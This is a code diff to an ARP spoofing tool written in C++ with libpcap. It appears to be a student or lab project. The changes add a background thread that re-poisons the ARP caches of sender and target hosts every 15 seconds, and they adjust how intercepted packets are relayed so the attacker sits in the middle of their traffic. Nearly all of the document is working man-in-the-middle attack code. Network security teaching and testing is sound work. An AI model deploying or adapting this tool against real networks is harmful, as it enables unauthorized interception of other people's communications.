@@ -1,5 +1,7 @@
 #include <cstdio>
 #include <pcap.h>
+#include <unistd.h>
+#include <pthread.h>
 #include "ethhdr.h"
 #include "arphdr.h"
 
@@ -9,6 +11,17 @@ struct EthArpPacket final {
 	ArpHdr arp_;
 };
 #pragma pack(pop)
+
+struct Args {
+	pcap_t* handle;
+	EthArpPacket *packet;
+	Mac *sm;
+	Ip *si;
+	Mac *tm;
+	Ip *ti; 
+	Mac mm; 
+	int cnt;
+};
 
 void usage() {
 	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
@@ -79,9 +92,8 @@ int arp_cache_poisoning(pcap_t* handle, EthArpPacket *packet, Mac sm, Ip si, Mac
 
 int check_arp_recover(pcap_t* handle, EthArpPacket *packet , Mac *sm, Ip *si, Mac *tm, Ip *ti, Mac mm, int cnt) {
 	for(int i=0; i<=cnt; i++) {
-		if((ntohl(packet->arp_.sip_) != si[i]) && (ntohl(packet->arp_.sip_) != ti[i])) continue;
 		if((ntohl(packet->arp_.tip_) != si[i]) && (ntohl(packet->arp_.tip_) != ti[i])) continue;	
-		if((packet->eth_.dmac_ != tm[i]) && (packet->eth_.dmac_ != Mac("FF:FF:FF:FF:FF:FF")) && (packet->eth_.dmac_ != sm[i])) continue;	
+		
 		for(int j=0; j<5; j++) {
 			if(!(arp_cache_poisoning(handle, packet, sm[i], si[i], tm[i], ti[i], mm))) return 0;
 		}
@@ -89,9 +101,9 @@ int check_arp_recover(pcap_t* handle, EthArpPacket *packet , Mac *sm, Ip *si, Ma
 	return 1;
 }
 
-int relay_packet(pcap_t* handle, pcap_pkthdr* header, EthArpPacket *packet , Mac *sm, Ip *si, Mac *tm, Mac mm, int cnt) {	
+int relay_packet(pcap_t* handle, pcap_pkthdr* header, EthArpPacket *packet , Mac *sm, Ip *si, Mac *tm, Ip *ti, Mac mm, int cnt) {	
 	for(int i=0; i<=cnt; i++) {
-		if(packet->eth_.smac_ == sm[i]) {
+		if((packet->eth_.smac_ == sm[i]) && (ntohl(*((uint32_t *)((uint8_t *)packet + 30))) == ti[i])) {
 			packet->eth_.dmac_ = tm[i];
 			packet->eth_.smac_ = mm;
 		}
@@ -117,14 +129,19 @@ int arp_spoofing(pcap_t* handle, Mac *sm, Ip *si, Mac *tm, Ip *ti, Mac mm, int c
 		}
 		EthArpPacket* packet = (EthArpPacket*)pkt;
 		if(ntohs(packet->eth_.type_) == EthHdr::Arp) {
-			//check arp recover and againg poisoning
-			//if arp request occurs to sender or target -> repoisoning
-			if(ntohs(packet->arp_.op_) != ArpHdr::Request) continue;
 			return check_arp_recover(handle, packet, sm, si, tm, ti, mm, cnt);
 		}
 		else if(packet->eth_.dmac_ == mm){
-			return relay_packet(handle, header, packet, sm, si, tm, mm, cnt);
+			return relay_packet(handle, header, packet, sm, si, tm, ti, mm, cnt);
 		}
+	}
+}
+
+void *send_arp_with_interval(void * p) {
+	Args *args = (Args *)p;
+	while(1) {
+		for(int i=0; i<=args->cnt; i++) arp_cache_poisoning(args->handle, args->packet, args->sm[i], args->si[i], args->tm[i], args->ti[i], args->mm);
+		sleep(15);
 	}
 }
 
@@ -223,13 +240,17 @@ int main(int argc, char* argv[]) {
 		printf("ARP CACHE POISONING COMPLETE\n");
 		
 	}
-	printf("\nARP SPOOFING IS ACTIVATED ...\n");
-	while(1) {
-		if(arp_spoofing(handle, sender_mac, sender_ip, target_mac, target_ip, my_mac, cnt)) continue;
-		printf("ERROR OCCURED\n");
-		break;
+	pthread_t thread;
+	Args args = {handle, &packet, sender_mac, sender_ip, target_mac, target_ip, my_mac, cnt};
+	if(!(pthread_create(&thread, NULL, send_arp_with_interval, (void *)(&args)))) {
+		printf("\nARP SPOOFING IS ACTIVATED ...\n");
+		while(1) {
+			if(arp_spoofing(handle, sender_mac, sender_ip, target_mac, target_ip, my_mac, cnt)) continue;
+			printf("ERROR OCCURED\n");
+			break;
+		}
 	}
-	pcap_close(handle);
+	else printf("ERROR OCCURED\n");
 	return 0;
 
 }
